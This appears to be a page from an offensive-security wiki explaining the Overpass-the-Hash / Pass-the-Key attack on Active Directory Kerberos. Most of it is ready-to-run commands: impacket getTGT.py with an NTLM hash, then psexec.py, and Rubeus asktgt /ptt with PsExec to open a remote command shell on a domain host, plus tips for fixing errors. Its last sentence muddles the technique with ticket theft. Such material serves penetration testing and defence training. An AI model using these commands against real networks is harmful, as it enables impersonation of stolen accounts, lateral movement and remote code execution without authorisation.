# Over Pass the Hash/Pass the Key

## Overpass The Hash/Pass The Key \(PTK\)

This attack aims to **use the user NTLM hash to request Kerberos tickets**, as an alternative to the common Pass The Hash over NTLM protocol. Therefore, this could be especially **useful in networks where NTLM protocol is disabled** and only **Kerberos is allowed** as authentication protocol.

In order to perform this attack, the **NTLM hash \(or password\) of the target user account is needed**. Thus, once a user hash is obtained, a TGT can be requested for that account. Finally, it is possible to **access** any service or machine **where the user account has permissions**.

```text
python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```

You can **specify** `-aesKey [AES key]` to specify to use **AES256**.   
You can also use the ticket with other tools like: as smbexec.py or wmiexec.py

Possible problems:

* _PyAsn1Error\(‘NamedTypes can cast only scalar values’,\)_ : Resolved by updating impacket to the lastest version.
* _KDC can’t found the name_ : Resolved by using the hostname instead of the IP address, because it was not recognized by Kerberos KDC.

```text
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```

This kind of attack is similar to Pass the Key, but instead of using hashes to request for a ticket, the ticket itself is stolen and used to authenticate as its owner.

